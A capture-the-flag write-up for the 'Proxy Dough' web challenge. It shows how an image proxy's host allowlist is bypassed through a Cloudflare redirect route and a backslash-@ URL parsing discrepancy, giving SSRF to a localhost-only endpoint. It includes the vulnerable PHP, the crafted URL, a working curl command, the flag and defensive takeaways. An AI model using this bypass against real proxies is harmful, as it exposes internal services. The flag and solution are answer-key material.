# Proxy Dough

**Category:** Web  ·  **Flag:** `ASIS{802ab2a8f0f435759ad6d1dfe8999de0}`

## Challenge Description

A cookie-dough store with a link to a "secret recipe". Prompt: *"We want the
secret recipe of this famous cookie dough, can you get it?"* Visiting the recipe
directly returns `Access not allowed.`: it only serves `127.0.0.1`/`::1`. The
goal is SSRF: make the site fetch its own recipe from localhost.

## Initial Analysis

Provided source: `index.php`, `products.php`, `api/proxy.php`, `api/recipe.php`,
`.htaccess` (all under `src/ProxyDough/`).

The recipe guard (`api/recipe.php`):

```php
if(!in_array($_SERVER["REMOTE_ADDR"], ["127.0.0.1", "::1"])) {
    http_response_code(403); die("Access not allowed.");
} else { die("ASIS{fake_flag}"); }
```

The homepage loads product images through `/api/proxy?url=...`. The proxy
(`api/proxy.php`) allowlists the URL:

```php
$parts = parse_url($url);
if (strtolower($parts['scheme']) !== 'https'
    || strtolower($parts['host']) !== 'img.proxydough.net') {
    deny(403, 'Host not allowed.');
}
$body = @file_get_contents($url, false, $context);   // follows redirects!
```

So the scheme must be `https` and the host exactly `img.proxydough.net`. The
critical flaw: PHP's HTTP stream wrapper **follows redirects by default**, and
only the first URL is validated: no redirect destination is re-checked.

## Vulnerability / Core Concept

A two-parser discrepancy chained through an allowed redirect gadget:

1. **Cloudflare redirect gadget.** Both hosts sit behind Cloudflare. Its image
   route `https://img.proxydough.net/cdn-cgi/image/onerror=redirect/<src>`
   issues a `307` to `<src>` when it can't produce an image. This gives a
   redirect *on the allowlisted host*.
2. **Backslash `@` parser discrepancy.** Cloudflare treats
   `http://proxydough.net\@127.0.0.1/api/recipe.php` as belonging to the
   `proxydough.net` zone (allowed) and preserves it in the redirect. PHP's
   `parse_url` reads `proxydough.net\` as **userinfo** and `127.0.0.1` as the
   **host**, so `file_get_contents` follows the redirect to the loopback.
3. **`recipe.php` not `/api/recipe`.** The loopback request uses `Host:
   127.0.0.1`, under which Apache's friendly rewrite doesn't apply, so
   `/api/recipe` 404s: hit the physical `/api/recipe.php`.

## Exploitation

The URL that passes the proxy's check (scheme `https`, host `img.proxydough.net`)
but redirects to localhost:

```
https://img.proxydough.net/cdn-cgi/image/onerror=redirect/http://proxydough.net\@127.0.0.1/api/recipe.php
```

Percent-encode it into the proxy's `url` param (`\` → `%5C`, `@` → `%40`):

```bash
curl -s --path-as-is \
  'https://proxydough.net/api/proxy?url=https%3A%2F%2Fimg.proxydough.net%2Fcdn-cgi%2Fimage%2Fonerror%3Dredirect%2Fhttp%3A%2F%2Fproxydough.net%5C%40127.0.0.1%2Fapi%2Frecipe.php'
```

Response: `ASIS{802ab2a8f0f435759ad6d1dfe8999de0}` (served with a spoofed
`Content-Type: image/png`, but the body is plain flag text). `solve.py` does the
encoding and request.

Request flow: proxy accepts `img.proxydough.net` → PHP fetches the Cloudflare
image route → CF returns `307 Location: http://proxydough.net\@127.0.0.1/...` →
PHP parses `127.0.0.1` as host and follows it → Apache sees a loopback request
→ `REMOTE_ADDR == 127.0.0.1` → recipe returns the flag through the proxy.

## Flag

`ASIS{802ab2a8f0f435759ad6d1dfe8999de0}`

## Key Takeaways

- An image proxy with a host allowlist must **not follow redirects** (or must
  re-validate every `Location`), not just the first URL.
- URL parser discrepancies (Cloudflare vs PHP over `\@`) turn a "safe" allowlist
  into an SSRF.
- `REMOTE_ADDR == 127.0.0.1` is not authentication: internal-only endpoints
  still need a real secret/token.

> Note: the challenge domain is shown as `proxydough.net` / `img.proxydough.net`
> because the exact hostnames are load-bearing for the parser-discrepancy trick.
